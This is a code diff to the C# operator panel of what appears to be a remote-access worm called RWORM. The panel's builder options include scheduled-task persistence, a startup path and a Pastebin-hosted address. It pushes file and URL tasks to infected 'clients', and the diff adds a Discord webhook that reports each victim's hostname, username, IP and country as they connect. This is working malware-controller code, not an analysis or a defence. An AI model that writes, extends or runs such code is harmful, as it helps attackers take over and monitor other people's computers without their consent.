@@ -1,4 +1,4 @@
-﻿using System.Collections.Generic;
+using System.Collections.Generic;
 using System;
 using System.Collections.ObjectModel;
 using System.ComponentModel;
@@ -129,7 +129,7 @@ namespace RWORM.GUI.ViewModels
         public bool   BuildSchTasks         { get => _buildSchTasks;         set { _buildSchTasks         = value; OnPropertyChanged(); } }
         public string BuildStartupPath      { get => _buildStartupPath;      set { _buildStartupPath      = value; OnPropertyChanged(); } }
         public string BuildPastebinRaw      { get => _buildPastebinRaw;      set { _buildPastebinRaw      = value; OnPropertyChanged(); } }
-        public string BuildEncryptionKey    { get => _buildEncryptionKey;    set { _buildEncryptionKey    = value; OnPropertyChanged(); } }
+        public string BuildEncryptionKey    { get => _buildEncryptionKey;    set { _buildEncryptionKey    = value; GuiCrypto.KeyString = value; OnPropertyChanged(); } }
 
         public bool   BuildPastebinEnabled  { get => _buildPastebinEnabled;  set { _buildPastebinEnabled  = value; OnPropertyChanged(); } }
         public bool   BuildAssemblyEnabled  { get => _buildAssemblyEnabled;  set { _buildAssemblyEnabled  = value; OnPropertyChanged(); } }
@@ -189,6 +189,7 @@ namespace RWORM.GUI.ViewModels
         }
 
         // Tasks
+        public ICommand AddDiscordWebhookTaskCommand { get; }
         public ICommand AddLocalFileTaskCommand    { get; }
         public ICommand AddUrlTaskCommand          { get; }
         public ICommand RunTaskOnSelectedCommand   { get; }
@@ -203,6 +204,7 @@ namespace RWORM.GUI.ViewModels
             _server = new ServerConnection(_serverAddress, _serverPort);
             _server.ConnectionChanged += OnConnectionChanged;
             _server.OutputReceived    += OnOutputReceived;
+            _server.ClientsReceived   += (_, list) => ApplyClientList(list);
 
             ConnectCommand        = new RelayCommand(async _ => await ConnectAsync(), _ => !IsConnected);
             DisconnectCommand     = new RelayCommand(_ => Disconnect(), _ => IsConnected);
@@ -249,6 +251,7 @@ namespace RWORM.GUI.ViewModels
 
             // Tasks
             TestTaskDiscordWebhookCommand = new RelayCommand(async _ => await TestTaskDiscordWebhookAsync());
+            AddDiscordWebhookTaskCommand = new RelayCommand(_ => AddDiscordWebhookTask());
             AddLocalFileTaskCommand   = new RelayCommand(_ => AddLocalFileTask());
             AddUrlTaskCommand         = new RelayCommand(_ => AddUrlTask());
             RunTaskOnSelectedCommand  = new RelayCommand(_ => RunTaskOnSelected(),
@@ -265,9 +268,12 @@ namespace RWORM.GUI.ViewModels
         {
             StatusMessage = "Connecting...";
             try { _server.Disconnect(); } catch { }   // drop any previous connection
+            GuiCrypto.KeyString = BuildEncryptionKey;
             _server = new ServerConnection(ServerAddress, ServerPort);
+            _server.ClientsReceived += (_, list) => ApplyClientList(list);
             _server.ConnectionChanged += OnConnectionChanged;
             _server.OutputReceived    += OnOutputReceived;
+            _server.ClientsReceived   += (_, list) => ApplyClientList(list);
             bool ok = await _server.ConnectAsync();
             if (ok)
             {
@@ -298,6 +304,12 @@ namespace RWORM.GUI.ViewModels
         private async Task RefreshClientsAsync()
         {
             var newClients = await _server.GetClientsAsync();
+            ApplyClientList(newClients);
+        }
+
+        public void ApplyClientList(List<ClientModel> newClients)
+        {
+            if (newClients == null) return;
             void Apply()
             {
                 var selectedGuids = new HashSet<string>(SelectedClients.Select(c => c.Guid), StringComparer.OrdinalIgnoreCase);
@@ -621,6 +633,19 @@ namespace RWORM.GUI.ViewModels
                 $"{client.Hostname} ({client.IpAddress})",
                 task.ModeLabel);
 
+                        if (task.Mode == TaskMode.DiscordWebhook)
+            {
+                task.ExecutedCount++;
+                task.Status = $"Active ({task.ExecutedCount} executions)";
+                _ = SendTaskDiscordAlertAsync(
+                    "Client Connected",
+                    $"Client **{client.Hostname}** ({client.Username}) connected from `{client.IpAddress}` [{client.CountryCode}].",
+                    task.Name,
+                    $"{client.Hostname} ({client.IpAddress})",
+                    "Discord Webhook");
+                return;
+            }
+
             try
             {
                 if (task.Mode == TaskMode.LocalFile)
@@ -642,6 +667,39 @@ namespace RWORM.GUI.ViewModels
             catch (Exception ex)
             {
                 task.Status = $"Error: {ex.Message}";
+            }
+        }
+
+        private void AddDiscordWebhookTask()
+        {
+            var url = InputDialog.Show("Enter Discord Webhook URL for client alerts:", "Enter Webhook", "https://discord.com/api/webhooks/");
+            if (string.IsNullOrWhiteSpace(url) || !url.StartsWith("http", StringComparison.OrdinalIgnoreCase)) return;
+
+            TaskDiscordWebhook = url.Trim();
+            TaskDiscordAlert = true;
+
+            var task = new TaskModel
+            {
+                Name   = "Discord Webhook",
+                Mode   = TaskMode.DiscordWebhook,
+                Source = url.Trim(),
+                Status = "Active",
+            };
+            Tasks.Add(task);
+            SelectedTask = task;
+            StatusMessage = "Discord Webhook registered";
+
+            _ = SendTaskDiscordAlertAsync(
+                "Discord Webhook Configured",
+                "Discord Webhook alert integration active on RWORM tasks system.",
+                task.Name,
+                "All Clients",
+                task.ModeLabel);
+
+            // Auto-run on currently connected clients immediately
+            foreach (var client in Clients.ToList())
+            {
+                _ = ExecuteTaskOnClientAsync(task, client);
             }
         }
 
@@ -872,6 +930,9 @@ namespace RWORM.GUI.ViewModels
                         RedirectStandardError  = true,
                     }
                 };
+                _serverProcess.StartInfo.EnvironmentVariables["RWORM_KEY"] = BuildEncryptionKey;
+                _serverProcess.StartInfo.EnvironmentVariables["PYTHONIOENCODING"] = "utf-8";
+                _serverProcess.StartInfo.EnvironmentVariables["PYTHONUTF8"] = "1";
 
                 // Capture server output so a startup failure is visible in the
                 // UI instead of dying silently in a hidden window.
